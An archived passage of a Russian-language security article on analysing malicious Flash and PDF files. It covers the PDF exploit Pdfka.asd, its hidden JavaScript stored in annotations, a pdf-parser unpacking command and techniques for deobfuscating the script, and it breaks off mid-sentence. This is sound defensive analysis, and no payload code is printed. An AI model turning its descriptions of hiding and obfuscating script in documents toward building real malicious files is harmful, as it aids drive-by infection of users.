<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/ga.js"></script><script src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app224.us.archive.org';v.server_ms=235;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://nobunkum.ru:80/ru/flash","20180418165306","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1524070386");
</script>
<link rel="stylesheet" type="text/css" href="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Атака через браузер. Анализ вредоносных Flash-объектов и документов в формате PDF</title>
  <!-- base href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/rss">
  <link rel="stylesheet" type="text/css" href="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20180418165306/http://nobunkum.ru:80/ru/flash</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://nobunkum.ru/ru/flash","20180418165306",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20180418165306/http://nobunkum.ru/ru/flash" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/"><img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li class="current"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <div id="content_text" style="margin-top: -10px;">
<div id="content_title"><h1>Атака через браузер. Анализ вредоносных Flash-объектов и документов в формате PDF.</h1></div>
<div id="article_author" class="author">Алиса Шевченко<br>Руководитель, Esage Lab<br><a href="https://web.archive.org/web/20180418165306/mailto:alisa@esagelab.ru">alisa@esagelab.ru</a> / <a href="https://web.archive.org/web/20180418165306/http://twitter.com/alisaesage" target="_blank">@alisaesage</a></div><br>

<div style="padding-left: 14px;">
<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#intro">Введение</a><br>
<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#analysis">Анализ вредоносных файлов</a><br>
	<div style="padding-left: 14px;">
	<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#example1">Пример 1. PDF + JavaScript</a><br>
	<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#example2">Пример 2. SWF</a><br>
	<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#example3">Пример 3. PDF + SWF</a><br>

	</div>
<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#conclusions">Выводы</a><br>
<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">Список ссылок</a><br>
</div>
<a id="a_title" name="intro" style="color:inherit;text-decoration: none;"><h2>Введение</h2></a>
В настоящий момент наибольшее количество заражений пользователей 
вредоносным кодом осуществляется через веб-технологии, причем за последний 
год количество таких атак увеличилось более чем в три раза<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[1]</a>. Причина 

этого - обширное пространство для атаки, которое обеспечивается как 
большим количеством потенциальных «жертв» в Интернете, так и значительным 

<div class="aside">
<p></p><h4>Статья также доступна на <a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/analytics/en-flash">английском</a> языке</h4><p></p>
</div>

разнообразием прикладных приложений и библиотек, используемых для 
отображения разных видов веб-контента: от классического - HTML и 
JavaScript, - до динамического и офисного - Flash, PDF, PPT (PowerPoint).  

<br><br>
Среди всех технологий заражения через веб наибольшую угрозу на сегодняшний 
день представляют вредоносные ролики Adobe Flash и PDF-документы. В 
частности, вредоносные файлы в формате PDF к концу 2009 года составили 80% 
всех обнаруживаемых эксплойтов<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[2]</a>. Как будет показано далее, 
функционирование троянских документов PDF обеспечивается не только 
эксплуатацией уязвимостей в Adobe Acrobat/Reader, но и эксплуатацией 
уязвимостей в Adobe Flash. 

<br><br>
Пока что мы говорим только об уязвимостях в программном обеспечении Adobe, 
поскольку они преобладают в статистистических отчетах компаний, 
занимающихся безопасностью. В реальности проблема несколько шире: в первую 
очередь это проблема уязвимостей в популярных форматах данных, во вторую - 
проблема прозрачной интеграции веб-страниц с различными видами 
содержимого.  
<br><br>
Сформулируем причины, по которым вектор массового заражения через 
эксплуатацию уязвимостей в обработчиках различных форматов данных 
представляет наибольшую опасность в настоящее время и обладает наибольшим 
потенциалом развития. 
<br><br>
1. Массивный вектор атаки.
<br><br>
Уязвимости в технологиях обработки популярных форматов данных, 
интегрируемых с веб-технологиями, в массе своей кроссплатформенны, 
кроссбраузерны и кроссформатны.  
<br><br>
Кроссплатформенность естественным образом следует из стремления 
производителей-монополистов (каким, к примеру, является Adobe по отношению 
к формату PDF) захватить максимум рынка. Приложение компилируется для 
разных операционных систем, но основано на одном и том же коде с одними и 
теми же ошибками. В качестве примера можно привести уязвимость 
CVE-2009-1862, вредоносный документ на основе которой будет рассмотрен в 
Примере 3: ей подвержены четыре операционные системы. 
<br><br>
Кроссбраузерность уязвимостей в форматах данных обеспечивается тем, что 
обработка чуждого браузеру формата файла происходит во внешнем независимом 
приложении. При этом файл либо передаётся внешнему обработчику через 
плагин и отобрается в окне браузера, либо через вызовы операционной 
системы открываетсяв соответствующем приложении. Таким образом, если файл 
эксплуатирует уязвимость самого обработчика, то она сработает вне 
зависимости от производителя, версии и своевременности обновлений браузера. 
 
<br><br>
Кроссформатность обеспечивается взаимной интеграцией технологий: 
Flash-ролик может быть встроен в документ PDF, код JavaScript может 
содержаться внутри PDF и Flash, и все три - Flash, PDF и JavaScript - 
могут вызываться из кода веб-страницы. Таким образом, одна и та же 
уязвимость может эксплуатироваться при помощи файлов разных типов. 
<br><br>
2. По мере того, как интернет становится всё более полноценной рабочей 
средой, углубляется интеграция классических веб-технологий с 
медиа-контентом и офисными файлами. По этой же причине производители 
браузеров стремятся сделать работу с различными файлами более прозрачной 
(например, отображать PDF в окне веб-страницы вместо сохранения его на 
диск), что способствует автоматизации массовых заражений. 
<br><br>

3. Значительный объём кода и динамичность развития библиотек для обработки 
форматов данных располагает к поиску и обнаружению все новых уязвимостей. 
К примеру, как показывает историческая ретроспектива по любой базе 
уязвимостей, тема уязвимостей в Adobe Flash неисчерпаема. 
<br><br>
4. Успеху атак с использованием вредоносных офисных документах (таких как 
PDF и PPT) пока ещё способствует социальный фактор: пользователю 
психологически проще открыть незнакомых офисный документ, чем запустить 
Flash-ролик или исполняемый файл, необходимость осторожного отношения с 
которыми достаточно широко освещена. 
<br><br>
5. Большинство браузеров настроены таким образом, чтобы автоматически 
запускать Flash-ролик и открывать PDF-документ. Таким образом, 
эксплуатация уязвимости и исполнение вредоносного кода происходит 
немедленно после перехода по вредоносной ссылке и загрузки 
соответствующего содержимого, без участия пользователя.  
<br><br>
Задача настоящей статьи - предоставить системную информацию о механизмах 
функционирования такого рода атак, а также логический и инструментальный 
фундамент для их анализа. 




<a id="a_title" name="analysis" style="color:inherit;text-decoration: none;"><h2>Анализ вредоносных файлов</h2></a> 
	<a id="a_title" name="example1" style="color:inherit;text-decoration: none;"><h3>Пример 1. PDF + JavaScript</h3></a>

Рассмотрим вредоносный документ PDF (MD5: 
c251dcf3190701c46ee6a3f562df32e6), который наиболее распространён в 
настоящее время. Этот файл был впервые обнаружен в <a href="https://web.archive.org/web/20180418165306/http://www.kaspersky.com/viruswatchlite?search_virus=pdfka.asd&amp;x=0&amp;y=0">декабре 2009 
г.</a>, сразу же попал в топ-20 вредоносных программ в Интернете<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[3]</a> (Pdfka.asd - 
12 место), и поднялся на две позиции топа в январе<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[4]</a> (Pidief.cvl - 10 
место), по-прежнему оставаясь единственным PDF-эксплойтом в пределах 
значимой статистики. (Примечание: экземпляры вредоносных файлов для этого 
и последующих примеров, а также файлы, полученные в процессе их анализа и 
обработки, доступны в приложенном к статье архиве). 

<br><br>
Это файл размером около 10 Кб. Открыв его в текстовом редакторе, можно 
увидеть в самом начале файла типичную для PDF-документа сигнатуру: %PDF. 
<br><br>
<b>Структура PDF</b>
<br><br>
Структура PDF-файла проста и читается невооружённым глазом. Начальные 
сведения, достаточные для изучения простых PDF-эксплойтов, можно 
почерпнуть в статье Д. Стивенса «Анатомия вредоносных PDF-документов» (на 
английском)<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[5]</a>. Полностью формат PDF описан в стандарте ISO 32000-1 и в 
соответствующем ему справочном документе, доступном для загрузки на сайте 
Adobe<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[6]</a>.   
<br><br>
Итак, рассмотрим структуру данного вредоносного файла. 
<br><br>

<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash01.png" width="600">
<br>
Дамп структуры PDF, оптимизированный для анализа, можно получить при 
помощи утилиты <a href="https://web.archive.org/web/20180418165306/http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser</a>. В данном 
случае пользоваться ею нет необходимости, поскольку файл небольшой, и вся 
структура PDF в нём видна как на ладони. Мы видим стандартных набор 
объектов: каталог (1), содержание (2), список страниц (3), описатель 
отдельной страницы (4), каталог комментариев (5), встроенный JavaScript 
(6) и два объекта типа stream (7 и 8). В stream-объектах внутри PDF 
хранятся различные вложенные данные, такие как картинки, скрипты и шрифты. 
Чаще всего эти данные упакованы при помощи алгоритма deflate 
(/FlateDecode). 
<br><br>
При анализе потенциально вредоносных PDF-файлов необходимо в первую 
очередь обращать внимание на активное содержимое документа. В данном 
случае привлекает внимание встроенный скрипт JavaScript (6), данные 
которого хранятся в упакованном объекте (7). Упакованный скрипт занимает 
всего 160 байт и практически не заметен при просмотре структуры PDF-файла. 
<br><br>
<b>От PDF к скрипту</b>
<br><br>
Распакуем упакованный объект при помощи утилиты pdf-parser:
<br><br>
&gt;pdf-parser.py -o 7 -f 0-sample &gt; 3-javascript-obj
<br><br>
В результате получается совсем маленький скрипт, который получает данные 
комментариев (или аннотаций, функция getAnnots) и после некоторой их 
обработки исполняет его как скрипт (функция eval). 
<br><br>

<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash02.png">
<br>

Почему именно getAnnots? В первых же результатах поиска Google по этому 
названию функции всплывает уязвимость CVE-2009-1492, связанная с ошибкой 
обработки комментариев в Adobe Acrobat. Но, как видно из соответствующего 
эксплойта<a href="https://web.archive.org/web/20180418165306/http://nobunkum.ru/ru/flash#reference">[7]</a>, эта уязвимость не имеет никакого отношения к данному случаю. 
Поле комментариев просто используется в качестве хранилища для массивной 
части скрипта, чтобы PDF-документ не вызывал подозрений с первого взгляда. 
<br><br>
Данные комментариев, получаемые функцией getAnnots, хранятся в сжатом виде 
в stream-объекте (8), на который ссылается объект Annot (5).  
<br><br>
<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash03.png" width="600">
<br>
Распаковав его аналогично предыдущему, получаем длинную строку вида 
z0dz0az0dz0az09:. Для преобразования этой строки в читаемый скрипт над ней 
необходимо произвести соответствующие манипуляции:
<br><br>
<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash04.png">
<br>
Как видно из кода, в полученной из хранилища аннотаций строке все символы 
'z' заменяются на '%' - разделительный символ между байтами в 
шестнадцатеричном представлении, последовательность которых функция 
unescape преобразует в бинарный вид (в данном случае - в 
последовательность символов ASCII). Для декодирования unescape пригодятся 
онлайн-скрипт <a href="https://web.archive.org/web/20180418165306/http://malc0de.com/tools/decode/unescape.html">Decode Unescape</a> или любая 
программа дла преобразования <a href="https://web.archive.org/web/20180418165306/http://home2.paulschou.net/tools/xlate/">HEX-ASCII</a>.  

<br><br>
После декодирования строки получаем достаточно большой и намеренно 
запутанный (обфусцированный) скрипт (см. файл 7-script2 в приложении).  
<br><br>
<b>Запутанный JavaScript</b>
<br><br>
Как анализировать намеренно запутанные скрипты? Во-первых, то, что 
заставляет скрипт выглядеть устрашающе - это просто псевдослучайные (вида 
v_8yD7D8CG__C) имена функций и переменных. Для повышения читаемости 
скрипта эти идентификаторы достаточно заменить на что-то более 
осмысленное. 
<br><br>
Во-вторых, нужно вычленить функциональную часть скрипта: функцию или 
последовательность функций, которые совершают основную работу. В данном 
случае, просмотрев скрипт по именам функций и управляющим директивам 
JavaScript (которые, в отличие от идентификаторов переменных, не поддаются 
запутыванию), находим ядро: функцию eval. Она вызывает следующую 
зашифрованную часть скрипта.  
<br><br>
<img src="%D0%90%D1%82%D0%B0%D0%BA%D0%B0%20%D1%87%D0%B5%D1%80%D0%B5%D0%B7%20%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80.%20%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7%20%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D1%8B%D1%85%20Flash-%D0%BE%D0%B1%D1%8A%D0%B5%D0%BA%D1%82%D0%BE%D0%B2%20%D0%B8%20%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2%20%D0%B2%20%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B5%20PDF_files/flash05.png">
<br>
<br>
Анализировать процедуру дешифрования не требуется - вместо этого можно 
заставить скрипт расшифровать самого себя. Для этого скрипт исполняется в 
соответствующей среде (например, в браузере с поддержкой JavaScript), 
причем функция eval внутри него должна быть заменена функкцией 
